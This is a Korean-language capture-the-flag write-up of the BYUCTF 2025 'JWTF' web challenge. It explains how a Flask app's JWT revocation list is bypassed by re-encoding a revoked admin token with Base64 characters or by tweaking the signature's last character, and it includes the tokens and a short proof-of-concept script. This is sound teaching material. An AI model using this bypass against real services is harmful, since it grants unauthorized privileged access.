# JWTF

```sql
Unfortunately one of our JWTs was compromised by attackers, so we created a JWT Revocation List to ensure they can't use it anymore.

https://jwtf.chal.cyberjousting.com
```

## Description

문제 설명을 해석하면 다음과 같습니다.

```
불행히도 공격자들에 의해 우리의 JWT 중 하나가 손상되어, 더 이상 사용할 수 없도록 JWT 폐기 목록을 만들었습니다.
```

그 다음 함께 제공된 링크에 접속하면 단순히 ‘Hello World!’ 만 적혀있는 페이지를 확인할 수 있습니다.

![image](./images/image-001.png)

이후 문제에서 제공된 파일들을 살펴보면 Flask로 구현된 웹 애플리케이션을 확인할 수 있었으며, 해당 파일에서 총 4개의 엔드포인트를 확인할 수 있었습니다.

1️⃣ `/` 

메인 페이지로, 해당 페이지를 요청하면 서버는 쿠키에 JWT를 발급합니다. 발급된 JWT에는 `admin` 값이 `false` 로 설정되어 있습니다.

```python
@app.route('/', methods=['GET'])
def main():
    resp = make_response('Hello World!')
    resp.set_cookie('session', jwt.encode({"admin": False}, APP_SECRET, algorithm="HS256"))
    return resp
```

2️⃣ `/get_admin_cookie` 

URL 파라미터로 `adminsecret` 과 `uid` 를 전달받아, `uid`가 '1337' 이거나 파라미터가 누락된 경우 메인 페이지(`/`)로 리다이렉트됩니다. 이후 전달된 `secret`이 `ADMIN_SECRET` 과 일치하는 경우 `admin` 값이 `true`로 설정된 JWT를 발급합니다.

```python
@app.route('/get_admin_cookie', methods=['GET'])
def get_admin_cookie():
    secret = request.args.get('adminsecret', None)
    uid = request.args.get('uid', None)

    if secret is None or uid is None or uid == '1337':
        return redirect('/')

    if secret == ADMIN_SECRET:
        resp = make_response('Cookie has been set.')
        resp.set_cookie('session', jwt.encode({"admin": True, "uid": uid}, APP_SECRET, algorithm="HS256"))
        return resp
```

3️⃣ `/flag` 엔드포인트

쿠키 `session` 을 가져와 폐기 목록(`jrl`)에 포함되어 있거나 JWT에 `admin` 값이 `True` 가 아닌 경우 메인 페이지로 리다이렉트되며, JWT의 `admin` 값이 `true` 라면 플래그를 반환합니다.

```python
@app.route('/flag', methods=['GET'])
def flag():
    session = request.cookies.get('session', None).strip().replace('=','')

    if session is None:
        return redirect('/')
    
    # check if the session is in the JRL
    if session in jrl:
        return redirect('/')

    try:
        payload = jwt.decode(session, APP_SECRET, algorithms=["HS256"])
        if payload['admin'] == True:
            return FLAG
        else:
            return redirect('/')
    except:
        return redirect('/')
```

4️⃣ `/jrl` 엔드포인트

JWT 폐기 목록(`jrl`)을 확인할 수 있는 엔드포인트로, 문제 설명에 기재된대로 서버가 더 이상 허용하지 않는 JWT 목록을 반환합니다.

```python
jrl = [
    jwt.encode({"admin": True, "uid": '1337'}, APP_SECRET, algorithm="HS256")
]

@app.route('/jrl', methods=['GET'])
def get_jrl():
    return make_response(json.dumps(jrl))
```

위 엔드포인트 중에서 플래그 정보를 반환하는 `/flag` 는 JWT의 `admin` 값이 반드시 `True` 이어야 플래그 정보를 반환하고 있습니다. 

✅ `/flag` 엔드포인트 코드 일부

```python
payload = jwt.decode(session, APP_SECRET, algorithms=["HS256"])
if payload['admin'] == True:
    return FLAG
```

그럼 JWT의 `admin` 값이 `True` 로 지정되어야 하는데, 이는 `/get_admin_cookie` 엔드포인트 처리 과정에서 이루어지고 있으나 랜덤한 32바이트 Hex 문자열을 알아야 합니다.

✅ `/get_admin_cookie` 엔드포인트 코드 일부

```python
ADMIN_SECRET = os.urandom(32).hex()
# ... 생략 ...
@app.route('/get_admin_cookie', methods=['GET'])
def get_admin_cookie():
	secret = request.args.get('adminsecret', None)
  uid = request.args.get('uid', None)
	# ... 생략 ...
	if secret == ADMIN_SECRET:
		resp = make_response('Cookie has been set.')
		resp.set_cookie('session', jwt.encode({"admin": True, "uid": uid}, APP_SECRET, algorithm="HS256"))
		return resp
# ... 생략 ...
```

이를 통해 플래그 정보는 다음의 과정을 통해 획득할 수 있지만 몇가지 제약사항이 존재합니다.

1. `/get_admin_cookie` 엔드포인트를 요청할 때 `ADMIN_SECRET` 의 값과 일치하는 값을 URL 파라미터 `adminsecret`(`secret`)로 전달한 뒤 JWT의 `admin` 이 `True` 인 토큰을 발급 받는다.
    - `ADMIN_SECRET` 는 랜덤한 32바이트 크기의 헥사 문자열로 예측하기가 매우 어렵다.
2. JWT의 `admin` 값이 `True` 인 토큰을 쿠키 `session` 에 담아 `/flag` 를 요청한다.
    - 전달한 쿠키 `session` 즉, JWT 토큰은 JWT 폐기 목록(`jrl`)에 존재하지 않아야 한다.

즉, 일반적으로 랜덤한 32바이트 크기의 헥사 문자열 `ADMIN_SECRET` 를 찾을 수 없으므로 위 과정으로 플래그 정보를 획득할 수는 없습니다.

## Solution

`/flag` 엔드포인트를 살펴보면, 쿠키로 전달된 `session` 값이 JWT 폐기 목록(`jrl`)에 존재하는지 확인하는 코드가 있습니다.

![image](./images/image-002.png)

JWT 폐기 목록(`jrl`)은 다음 코드와 같이 `APP_SECRET` 으로 서명된 JWT를 리스트로 저장한 것입니다.

```python
# JRL - JWT Revocation List
jrl = [
    jwt.encode({"admin": True, "uid": '1337'}, APP_SECRET, algorithm="HS256")
]
```

그리고 이 `jrl` 에 담긴 값은 아래와 같이 URL `/jrl` 을 요청하면 확인할 수 있습니다.

![image](./images/image-003.png)

위 `jrl` 에 담긴 JWT는 다음과 같이 세 부분으로 구성되어 있으며, 각각은 `Base64URL` 방식으로 인코딩된 문자열입니다.

```python
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew"
```

✅ JWT 구조

| <base64url-encoded header> | <base64url-encoded payload> | <base64url-encoded signature> |
| --- | --- | --- |

이때 일반적인 `Base64` 가 아닌 `Base64URL` 를 사용하는 이유는 다음과 같습니다.

✅ JWT에서 일반 `Base64` vs `Base64URL`

기존의 `Base64` 인코딩은 아래와 같은 문자를 포함합니다:

- `+` URL에서 공백처럼 오해될 수 있음
- `/` URL 경로 구분자로 인식될 수 있음
- `=` 패딩 문자로, URL 파라미터에서 문제를 일으킬 수 있음

이러한 이유로, JWT에서는 URL이나 HTTP 헤더에서 안전하게 사용할 수 있도록 `Base64URL` 인코딩을 사용하며, 다음과 같이 문자를 변환하여 충돌을 방지합니다

| `Base64` 문자 | `Base64URL` 문자 |
| --- | --- |
| `+` | `-` |
| `/` | `_` |
| `=` | (제거됨) |

따라서 조금 전 `/jrl` 을 통해 확인한 JWT 값에서 `-`, `_` 문자를 각각 `+`, `/` 로 바꾸면 문자열 자체는 달라지지만, 디코딩 결과는 동일한 값을 나타냅니다. 이는 `Base64` 와 `Base64URL` 이 같은 바이너리 데이터를 표현하는 방식만 다를 뿐 동일한 정보를 담고 있기 때문입니다.

참고로 패딩 문자(`=`)를 추가하는 방식도 있지만 해당 문제에서는 패딩 문자를 제거하고 있습니다.

![image](./images/image-004.png)

결과적으로 `/jrl` 을 요청해서 얻은 JWT는 `admin` 이 `True` 인 값이므로, 이 값에서 `Base64URL` 일부 문자를 `Base64` 문자를 변경합니다. 이후 변경된 JWT를 쿠키 `session` 에 담아 `/flag` 를 요청하면 `jrl` 과 비교하는 구문에서 문자열이 다르므로 JWT 폐기 목록을 검증하는 구문을 우회할 수 있습니다.

## Exploit

`/jrl` 을 요청해서 JWT 값을 획득합니다.

![image](./images/image-005.png)

이후 위 JWT의 값에서 `Base64URl` 문자(`-`, `_`)를 `Base64` 문자(`+`, `/`)로 변경합니다.

```bash
# 변경 전
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew

# 변경 후
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew
```

그 다음 변경된 JWT 값을 Cookie `session` 에 담아 `/flag` 를 요청하면 플래그를 획득할 수 있습니다.

![image](./images/image-006.png)

그 밖에, 공식 Write-Up에서는 마지막 서명 문자열의 일부를 바꾸는 방법을 설명해줬는데 이는 다음과 같습니다.

✅ 공식 Write-Up 설명(ref. https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/jwtf)

JWT의 마지막 문자를 `Base64URL` 인코딩 문자셋에서 알파벳 상 다음 문자로 바꿨을 때, 디코딩한 결과 바이트 배열이 같을 수 있다. 그 이유는 `Base64` 인코딩의 마지막 블록이 표현하는 비트 중 일부가 실제 데이터가 아닌 패딩 또는 잘려나가는 비트이기 때문입니다. 따라서, 마지막 문자의 변화가 실제 디코딩 결과에 영향을 주지 않는 경우가 생길 수 있습니다. 

이에 대한 PoC 코드는 다음과 같습니다.

```python
import base64

def decode_base64url(s):
    # Base64URL에서는 항상 4의 배수 길이여야 함.
    padded = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(padded)

# JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew
jwt_signature = "BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew"
jwt_signature_change = "BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ex"
print(decode_base64url(jwt_signature))
print(decode_base64url(jwt_signature_change))

# b'\x06pX\x0e\x86\xd9V\xcaVo\x1b\xb8\x8c\xbd\xdcM\xfa\xe2\xfc\x8cM\xa2-\xf7\xab\xe4\xd1-\xb1\xd5\xf9\xec'
# b'\x06pX\x0e\x86\xd9V\xcaVo\x1b\xb8\x8c\xbd\xdcM\xfa\xe2\xfc\x8cM\xa2-\xf7\xab\xe4\xd1-\xb1\xd5\xf9\xec'
# True
```